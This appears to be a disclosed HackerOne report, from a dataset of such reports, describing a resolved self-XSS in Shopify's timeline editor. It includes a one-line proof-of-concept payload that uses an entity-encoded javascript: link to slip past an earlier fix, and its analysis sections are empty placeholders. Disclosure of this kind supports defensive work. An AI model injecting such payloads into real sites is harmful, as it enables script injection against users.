---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '755679'
original_report_id: '755679'
title: 'Timeline Editor Self-XSS (Previous Fix #738072 Incomplete)'
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: shopify
created_at: '2019-12-11T03:05:20.060Z'
disclosed_at: '2020-03-16T08:32:02.979Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 34
asset_identifier: your-store.myshopify.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Timeline Editor Self-XSS (Previous Fix #738072 Incomplete)

## Metadata

- HackerOne Report ID: 755679
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: shopify
- Disclosed At: 2020-03-16T08:32:02.979Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

1.Consistent steps
2.poc: `<img src=1111111><img src=1111111><a href="javascript:alert&#40/1/&#41">axxx</a><svg></svg><img src=1>`
3. {F656339}

## Impact

admin

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
